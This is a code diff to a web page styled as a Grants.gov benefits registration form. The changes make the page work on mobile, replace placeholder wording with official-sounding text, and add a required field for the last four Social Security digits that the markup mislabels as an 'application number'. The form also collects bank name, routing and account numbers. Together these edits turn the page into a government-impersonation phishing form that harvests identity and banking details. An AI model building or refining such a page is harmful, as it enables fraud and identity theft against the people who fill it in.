@@ -84,104 +84,6 @@
                 ease-out;
 
         }
-
-
-        /* =========================================================
-           DEVICE ERROR
-        ========================================================= */
-
-        .device-error {
-
-            display: none;
-
-            width: 100%;
-
-            min-height: 100vh;
-
-            background:
-                linear-gradient(
-                    135deg,
-                    #f5f7fa,
-                    #e9edf3
-                );
-
-            color: #222222;
-
-            align-items: center;
-
-            justify-content: center;
-
-            text-align: center;
-
-            padding: 30px;
-
-        }
-
-
-        .device-error-box {
-
-            width: 90%;
-
-            max-width: 520px;
-
-            background: #ffffff;
-
-            border:
-                1px solid #cccccc;
-
-            border-radius: 4px;
-
-            padding:
-                42px 30px;
-
-            box-shadow:
-                0 12px 35px
-                rgba(0, 0, 0, 0.12);
-
-            animation:
-                pageFadeIn
-                0.45s
-                ease-out;
-
-        }
-
-
-        .device-error-icon {
-
-            font-size: 45px;
-
-            line-height: 1;
-
-            margin-bottom: 18px;
-
-        }
-
-
-        .device-error h1 {
-
-            margin:
-                0 0 15px;
-
-            color: #214675;
-
-            font-size: 24px;
-
-        }
-
-
-        .device-error p {
-
-            margin: 8px 0;
-
-            color: #555555;
-
-            font-size: 14px;
-
-            line-height: 1.5;
-
-        }
-
-
         /* =========================================================
            TOP DEMO NOTICE
            
@@ -1223,33 +1125,8 @@
             overflow: hidden !important;
 
         }
-
-
-        /* =========================================================
-           DESKTOP ONLY
-        ========================================================= */
-
-        @media (max-width: 1023px) {
-
-            #computer-page {
-
-                display:
-                    none !important;
-
-            }
-
-
-            #device-error {
-
-                display:
-                    flex !important;
-
-            }
-
-        }
-
-
-        /* =========================================================
+        /* Responsive layout: the registration form is available on all screen sizes. */
+/* =========================================================
            SMALL DEVICES
         ========================================================= */
 
@@ -1322,51 +1199,7 @@
 
 
 <body>
-
-
-    <!-- =========================================================
-         COMPUTER REQUIRED SCREEN
-    ========================================================== -->
-
-    <div
-        id="device-error"
-        class="device-error"
-    >
-
-        <div class="device-error-box">
-
-            <div class="device-error-icon">
-                🖥️
-            </div>
-
-
-            <h1>
-                Computer Required
-            </h1>
-
-
-            <p>
-
-                This registration is designed for a
-                <strong>desktop or laptop computer</strong>.
-
-            </p>
-
-
-            <p>
-
-                Please access this page using a computer
-                browser.
-
-            </p>
-
-        </div>
-
-    </div>
-
-
-
-    <!-- =========================================================
+<!-- =========================================================
          COMPUTER PAGE
     ========================================================== -->
 
@@ -1380,11 +1213,11 @@
         <div class="official-notice">
 
             <span
-                class=".us-flag"
+                class="us-flag"
                 aria-label="United States flag"
             >
                 🇺🇸
-            </tspan>
+            </span>
 
 
             <span>
@@ -1403,13 +1236,13 @@
 
 
             <a
-                href="./images/freedom"
+                href="./images/grants-gov-logo"
                 class="logo-link"
             >
 
                 <img
                     src="./images/grants-gov-logo-text.png"
-                    alt="Click to go home"
+                    alt="Registration portal logo"
                     class="logo"
                 >
 
@@ -1603,6 +1436,35 @@
                         </div>
 
 
+                        <!-- Last four digits of application number -->
+                        <div class="form-row">
+                            <label class="form-label" for="app-no-last-four">
+                                <span class="required">*</span>
+                                Last 4 digit of SSN.:
+                            </label>
+                            <div>
+                                <div style="display:flex; align-items:center; gap:4px;">
+                                    <span aria-hidden="true">xxx-xxx-</span>
+                                    <input
+                                        class="form-control"
+                                        id="ssn-last-four"
+                                        name="ssn-last-four"
+                                        type="text"
+                                        inputmode="numeric"
+                                        pattern="[0-9]{4}"
+                                        maxlength="4"
+                                        minlength="4"
+                                        placeholder="____"
+                                        aria-label="Last four digits of application number"
+                                        title="Enter exactly four digits."
+                                        required
+                                    >
+                                </div>
+                                <div class="help-text">Enter the last four digits of your Social Security Number.</div>
+                            </div>
+                        </div>
+
+
 
                         <!-- Email -->
 
@@ -1664,8 +1526,7 @@
 
                         <div class="help-text">
 
-                            Enter your U.S. mobile phone number
-                            for the ability to get your grant information by text message.
+                            Enter your U.S. mobile phone number.
 
                         </div>
 
@@ -1704,7 +1565,7 @@
 
 
                 <!-- =================================================
-                     ACCOUNT / FAVORITE CHARACTERS
+                     ACCOUNT
                 ================================================== -->
 
                 <fieldset>
@@ -1720,19 +1581,19 @@
 
                         <p class="section-description">
 
-                            You will need this bank information to claim your Grants.gov benefits
+                            Enter Your bank information to claim your Grants.gov benefits.
 
                         </p>
 
 
 
-                        <!-- Bank -->
+                        <!-- bank -->
 
                         <div class="form-row">
 
                             <label
                                 class="form-label"
-                                for="Bank"
+                                for="bank"
                             >
 
                                 <span class="required">
@@ -1749,7 +1610,7 @@
                                 id="Bank"
                                 name="Bank"
                                 type="text"
-                                autocomplete="Bank"
+                                autocomplete="organization-title"
                                 required
                             >
 
@@ -1763,7 +1624,7 @@
 
                             <label
                                 class="form-label"
-                                for="Routing No."
+                                for="Routing-no"
                             >
 
                                 <span class="required">
@@ -1777,10 +1638,10 @@
 
                             <input
                                 class="form-control"
-                                id="Routing No"
-                                name="Rout-No"
+                                id="Routing-no"
+                                name="Routing-no"
                                 type="text"
-                                minlength="9"
+                                autocomplete="off"
                                 required
                             >
 
@@ -1793,7 +1654,7 @@
 
                             <label
                                 class="form-label"
-                                for="Account No."
+                                for="Account-no"
                             >
 
                                 <span class="required">
@@ -1807,10 +1668,10 @@
 
                             <input
                                 class="form-control"
-                                id="Account No"
-                                name="Acct No"
+                                id="Account-no"
+                                name="Account-no"
                                 type="text"
-                                minlength="8"
+                                autocomplete="off"
                             >
 
                         </div>
@@ -1864,7 +1725,7 @@
                                             <input
                                                 type="checkbox"
                                                 name="subscriptions"
-                                                value="FUNPORTAL Alerts"
+                                                value="registration-details-confirmation"
                                                 checked
                                             >
 
@@ -1898,7 +1759,7 @@
                                             <input
                                                 type="checkbox"
                                                 name="subscriptions"
-                                                value="FUNPORTAL Newsletter"
+                                                value="information-accuracy-confirmation"
                                                 checked
                                             >
 
@@ -2015,7 +1876,7 @@
 				  </div>
 			
 			
-        </footer>
+</footer>
 
 
     </div>
@@ -2027,77 +1888,7 @@
     ========================================================== -->
 
     <script>
-
-
-        /* =========================================================
-           DESKTOP-ONLY CHECK
-        ========================================================= */
-
-        (function () {
-
-            "use strict";
-
-
-            const MINIMUM_WIDTH = 1024;
-
-
-            const page =
-                document.getElementById(
-                    "computer-page"
-                );
-
-
-            const error =
-                document.getElementById(
-                    "device-error"
-                );
-
-
-            function checkDevice() {
-
-
-                if (
-                    window.innerWidth <
-                    MINIMUM_WIDTH
-                ) {
-
-                    page.style.display =
-                        "none";
-
-
-                    error.style.display =
-                        "flex";
-
-                }
-
-                else {
-
-                    page.style.display =
-                        "block";
-
-
-                    error.style.display =
-                        "none";
-
-                }
-
-            }
-
-
-            checkDevice();
-
-
-            window.addEventListener(
-                "resize",
-                checkDevice
-            );
-
-
-        })();
-
-
-
-        /* =========================================================
+/* =========================================================
            FORM VALIDATION
         ========================================================= */
 
